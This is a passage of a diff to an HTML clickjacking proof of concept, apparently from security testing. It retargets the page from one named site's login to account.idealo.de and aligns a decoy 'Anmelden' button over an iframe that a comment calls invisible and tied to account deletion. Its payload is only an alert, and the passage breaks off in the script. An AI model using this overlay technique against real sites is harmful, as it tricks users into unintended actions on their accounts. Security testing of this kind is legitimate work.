@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SGRH POC</title>
+<title>IDEALO POC</title>
 <style>
     iframe {
         position: absolute;
@@ -16,17 +16,18 @@
     }
 
     button {
-        z-index: 200;
-        top:400px;
-	left: 680px;
-        position: relative;
-	background-color:#20214a;
-
-    padding: 14px 155px;      /* Increase space inside the button */
+      z-index: 200;
+    top: 298px;              /* Added px unit */
+    left: 650px;             /* Added px unit */
+    position: relative;
+    background-color: #0665bb;
+    color: white;            /* White text for contrast */
+    padding: 10px 180px;     /* Increase space inside the button */
     font-size: 16px;         /* Make the text larger */
-    border-radius: 5px;      /* Optional: make it look nicer */
-    cursor: pointer;         /* Optional: show pointer on hover */
-color:white;
+    font-weight: bold;       /* Bold like the screenshot */
+    border: none;            /* Remove default border */
+    border-radius: 3px;      /* Slightly rounded corners */
+    cursor: pointer;
     }
     h1 {
         top: 300px;
@@ -36,10 +37,10 @@ color:white;
 </style>
 </head>
 <body>
-<button onclick="alert('Surprise Hacked!')">Sign In</button>
+<button onclick="alert('Surprise Hacked!')">Anmelden</button>
 
 <!-- Invisible iframe targeting the account deletion URL -->
-<iframe id="target-frame" src="https://labresults.sgrh.com/Login.aspx" frameborder="0"></iframe>
+<iframe id="target-frame" src="https://account.idealo.de/login" frameborder="0"></iframe>
 
 <script>
     
